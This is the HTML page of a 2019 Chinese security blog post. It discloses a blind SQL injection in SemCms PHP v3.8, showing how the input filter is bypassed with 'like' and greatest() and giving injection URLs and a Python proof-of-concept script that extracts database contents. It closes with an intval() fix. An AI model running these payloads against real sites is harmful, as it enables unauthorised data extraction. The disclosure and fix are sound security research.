@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="Apimgg1hM4">
+<meta name="google-site-verification" content="ifZoQ94LmUy8sy2SVlrhnNGumEzL2SSrC4MQAq67iic">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,0day挖掘,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:[http://www.sem-cms.com/][1]审计版本为最新php版">
+<meta name="keywords" content="代码审计,0day挖掘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="semcms_php_v3.8 前台鸡肋sql注入">
+<meta property="og:url" content="http://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/index.html">
+<meta property="og:site_name" content="Boogle&#39;s Blogs">
+<meta property="og:description" content="0x00 前言SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:[http://www.sem-cms.com/][1]审计版本为最新php版">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89d09c2c001.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89c8a1355b8.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89c8dfa6530.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89c84bc07d7.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89ca93d6243.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89ca37ab50c.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89cc6d21650.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89cd482823e.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89cd00f0af3.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/14/5c89ceff54e64.png">
+<meta property="og:updated_time" content="2019-03-23T13:25:57.382Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="semcms_php_v3.8 前台鸡肋sql注入">
+<meta name="twitter:description" content="0x00 前言SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:[http://www.sem-cms.com/][1]审计版本为最新php版">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/14/5c89d09c2c001.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/">
+
+
+
+
+
+  <title>semcms_php_v3.8 前台鸡肋sql注入 | Boogle's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Boogle's Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">没有网络安全，就没有国家安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">semcms_php_v3.8 前台鸡肋sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-14T21:16:03+08:00">
+                2019-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网:[<a href="http://www.sem-cms.com/][1]" target="_blank" rel="noopener">http://www.sem-cms.com/][1]</a><br>审计版本为最新php版 <code>v3.8</code><br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p>
+<h2 id="0x01-鸡肋sql注入"><a href="#0x01-鸡肋sql注入" class="headerlink" title="0x01 鸡肋sql注入"></a>0x01 鸡肋sql注入</h2><p>首先查看<code>index.php</code><br><img src="https://i.loli.net/2019/03/14/5c89c8a1355b8.png" alt><br>引入了<code>web_inc.php</code>,跟进查看，发现第一处sql查询<br><img src="https://i.loli.net/2019/03/14/5c89c8dfa6530.png" alt><br>可以看到<code>language</code>变量未用引号包裹，但是在此之前使用<code>verify_str()</code>函数对传入的参数进行了处理。<br>跟进发现是过滤函数,对常用sql语句进行了过滤<br><img src="https://i.loli.net/2019/03/14/5c89c84bc07d7.png" alt><br>针对过滤函数，可以发现可以对其进行sql盲注。<br>其中 <code>=</code> 可以使用<code>like</code>绕过<br>构造注入语句<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/semcms_php_v3<span class="meta">.8</span>/?languageIDD=<span class="number">1</span> <span class="keyword">and</span> greatest(length(database()),<span class="number">0</span>) like <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/03/14/5c89ca93d6243.png" alt><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>/semcms_php_v3<span class="meta">.8</span>/?languageIDD=<span class="number">1</span> <span class="keyword">and</span> greatest(length(database()),<span class="number">0</span>) like <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/03/14/5c89ca37ab50c.png" alt><br>可以看到存在明显注入并得到数据库长度<br>但是这里比较鸡肋的是，因为过滤函数过滤了<code>select</code>。导致无法深层次的获取数据库内容，只能获取<code>database()</code>,’user()’,’version()’等信息。</p>
+<h2 id="0x03-鸡肋放大"><a href="#0x03-鸡肋放大" class="headerlink" title="0x03 鸡肋放大"></a>0x03 鸡肋放大</h2><p>这里虽然无法使用<code>select</code>语句获取更多信息，但也不局限于<code>database()</code>等信息。<br>可以通过盲注获取当前表即其查询的<code>sc_tagandseo</code>表内其他字段内容。<br>因为该cms安装数据库时为自动安装，所以所有字段名都可以得到。<br><img src="https://i.loli.net/2019/03/14/5c89cc6d21650.png" alt><br>这里以<code>tag_newkey</code>为例<br><code>http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%201</code><br><img src="https://i.loli.net/2019/03/14/5c89cd482823e.png" alt><br><code>http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%20110</code><br><img src="https://i.loli.net/2019/03/14/5c89cd00f0af3.png" alt><br>页面返回不同证明了可以进行注入。</p>
+<p>这里其实只是证明可以通过注入获取数据，然而从该表注入出的数据并没有什么卵用。<br>既然绕过了其过滤函数，继续全局搜索，看看其他表是否存在类似注入，稍微搜一下，发现<code>sc_email`</code>sc_msg`等多个表的查询还是有类似情况的，这几个表的信息还是比较丰富的，没有继续深究，诸位可继续深入挖掘。<br><img src="https://i.loli.net/2019/03/14/5c89ceff54e64.png" alt></p>
+<h2 id="0x04-poc"><a href="#0x04-poc" class="headerlink" title="0x04 poc"></a>0x04 poc</h2><p>上面提到的简单exp，可供测试<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">#[+]author by boogle</span><br><span class="line">#[+]blo<span class="variable">g:</span>  http<span class="variable">s:</span>//boogle.github.io</span><br><span class="line">url = <span class="string">'http://127.0.0.1/semcms_php_v3.8/?languageIDD=1'</span></span><br><span class="line">payload_len = <span class="string">' and greatest(length(database()),0) like &#123;0&#125;'</span></span><br><span class="line">payload_database = <span class="string">'%20and%20greatest(ascii(substr(database(),&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'</span></span><br><span class="line">payload_tag = <span class="string">'%20and%20greatest(ascii(substr(tag_newkey,&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'</span></span><br><span class="line">#获取数据库长度</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">	payload = url+payload_len.format(str(i))</span><br><span class="line">	#print payload</span><br><span class="line">	<span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'About Us'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[+] The databse length is '</span>+str(i)</span><br><span class="line">		length = i</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"># 获取数据库</span><br><span class="line">databse = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">j</span> in xrange(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">			payload = url + payload_database.format(str(i),str(<span class="keyword">j</span>))</span><br><span class="line">			<span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'About Us'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">				databse += chr(<span class="keyword">j</span>)</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'[+] Payloading :'</span>+databse</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] The databse is '</span>+databse</span><br><span class="line">#获取tag_newkey字段内容</span><br><span class="line"><span class="keyword">tag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">j</span> in xrange(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = url + payload_tag.format(str(i),str(<span class="keyword">j</span>))</span><br><span class="line">		<span class="keyword">res</span> = requests.<span class="built_in">get</span>(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'We main manufacturer'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">			<span class="keyword">tag</span> += chr(<span class="keyword">j</span>)</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[+] Payloading :'</span>+<span class="keyword">tag</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]tag_newkey '</span>+<span class="keyword">tag</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h2><p>传入的int类型参数使用<code>intval()</code>函数强制类型转换。<br>[1]:<a href="http://www.sem-cms.com/" target="_blank" rel="noopener">http://www.sem-cms.com/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/semcms-php-v3-8-前台鸡肋sql注入/">semcms_php_v3.8 前台鸡肋sql注入</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年03月14日 - 21:16</p>
+  <p><span>最后更新:</span>2019年03月23日 - 21:25</p>
+  <p><span>原始链接:</span><a href="/semcms-php-v3-8-前台鸡肋sql注入/" title="semcms_php_v3.8 前台鸡肋sql注入">http://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/semcms-php-v3-8-前台鸡肋sql注入/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+    </div>
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/0day挖掘/" rel="tag"><i class="fa fa-tag"></i> 0day挖掘</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Bypass-PCREWAF/" rel="next" title="Bypass PCREWAF">
+                <i class="fa fa-chevron-left"></i> Bypass PCREWAF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/semcms-php-v3-8-cookie注入绕过后台登陆/" rel="prev" title="semcms_php_v3.8 cookie注入绕过后台登陆">
+                semcms_php_v3.8 cookie注入绕过后台登陆 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/boogle.jpg" alt="boogle">
+            
+              <p class="site-author-name" itemprop="name">boogle</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+          
+    <div class="links-of-blogroll motion-element links-of-blogroll-block">
+      <div class="links-of-blogroll-title">
+        <!-- modify icon to fire by szw -->
+        <i class="fa fa-history fa-" aria-hidden="true"></i>
+        最近文章
+      </div>
+      <ul class="links-of-blogroll-list">
+        
+        
+          <li>
+            <a href="/Ljphpcms-v1-03代码审计之csrf-xss/" title="Ljphpcms_v1.03代码审计之csrf&&xss" target="_blank">Ljphpcms_v1.03代码审计之csrf&&xss</a>
+          </li>
+        
+          <li>
+            <a href="/burpsuite安装分块传输插件/" title="burpsuite安装分块传输插件" target="_blank">burpsuite安装分块传输插件</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8任意文件刪除/" title="semcms_php_v3.8任意文件刪除" target="_blank">semcms_php_v3.8任意文件刪除</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8-后台注入getshell/" title="semcms_php_v3.8 后台注入getshell" target="_blank">semcms_php_v3.8 后台注入getshell</a>
+          </li>
+        
+          <li>
+            <a href="/semcms-php-v3-8-时间盲注/" title="semcms_php_v3.8 时间盲注" target="_blank">semcms_php_v3.8 时间盲注</a>
+          </li>
+        
+      </ul>
+    </div>
+
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-鸡肋sql注入"><span class="nav-number">2.</span> <span class="nav-text">0x01 鸡肋sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-鸡肋放大"><span class="nav-number">3.</span> <span class="nav-text">0x03 鸡肋放大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-poc"><span class="nav-number">4.</span> <span class="nav-text">0x04 poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-修复方案"><span class="nav-number">5.</span> <span class="nav-text">0x05 修复方案</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">boogle</span>
+
+  
+</div>
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
